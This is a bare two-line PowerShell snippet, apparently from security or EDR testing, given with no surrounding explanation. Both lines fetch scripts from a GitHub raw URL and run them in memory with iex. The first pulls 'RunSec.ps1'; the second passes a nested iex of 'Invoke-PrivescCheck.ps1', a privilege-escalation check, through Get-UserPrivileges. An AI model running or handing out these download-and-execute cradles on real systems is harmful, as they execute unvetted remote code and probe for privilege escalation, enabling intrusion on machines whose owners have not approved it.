iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/St3v3a/falcontest/master/RunSec.ps1')
Get-UserPrivileges -argument " -c iex('https://raw.githubusercontent.com/St3v3a/falcontest/master/Invoke-PrivescCheck.ps1')"
